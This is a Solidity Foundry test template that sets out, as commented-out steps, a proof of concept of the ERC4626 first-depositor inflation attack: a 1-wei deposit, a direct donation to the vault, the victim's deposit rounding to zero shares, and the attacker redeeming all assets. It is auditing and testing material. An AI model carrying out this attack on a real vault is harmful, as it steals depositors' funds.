// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// TODO: import the target vault and token
// import {Vault} from "src/Vault.sol";
// import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @title ERC4626 First Depositor Inflation Attack PoC
/// @notice Demonstrates share inflation via donation to empty vault
contract FirstDepositorInflation is Test {
    // TODO: declare contracts
    // Vault vault;
    // ERC20 token;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        // TODO: deploy or fork vault
        // vm.createSelectFork("mainnet", BLOCK_NUMBER);
        // vault = Vault(VAULT_ADDRESS);
        // token = ERC20(vault.asset());

        // Fund accounts
        // deal(address(token), attacker, 1_000_000e18);
        // deal(address(token), victim, 1_000_000e18);
    }

    function testInflationAttack() public {
        // Step 1: Attacker deposits 1 wei
        vm.startPrank(attacker);
        // token.approve(address(vault), type(uint256).max);
        // uint256 shares = vault.deposit(1, attacker);
        // assertEq(shares, 1, "Attacker should get 1 share");

        // Step 2: Attacker donates large amount directly to vault
        // uint256 donation = 1_000_000e18;
        // token.transfer(address(vault), donation);

        // Step 3: Check exchange rate is inflated
        // uint256 previewShares = vault.previewDeposit(999_999e18);
        // assertEq(previewShares, 0, "Victim gets 0 shares due to rounding");
        vm.stopPrank();

        // Step 4: Victim deposits and gets 0 shares
        vm.startPrank(victim);
        // token.approve(address(vault), type(uint256).max);
        // uint256 victimShares = vault.deposit(999_999e18, victim);
        // assertEq(victimShares, 0, "VULNERABILITY: Victim got 0 shares");
        vm.stopPrank();

        // Step 5: Attacker redeems for all assets
        vm.startPrank(attacker);
        // uint256 redeemed = vault.redeem(1, attacker, attacker);
        // assertGt(redeemed, 1_000_000e18, "Attacker stole victim funds");
        vm.stopPrank();
    }
}
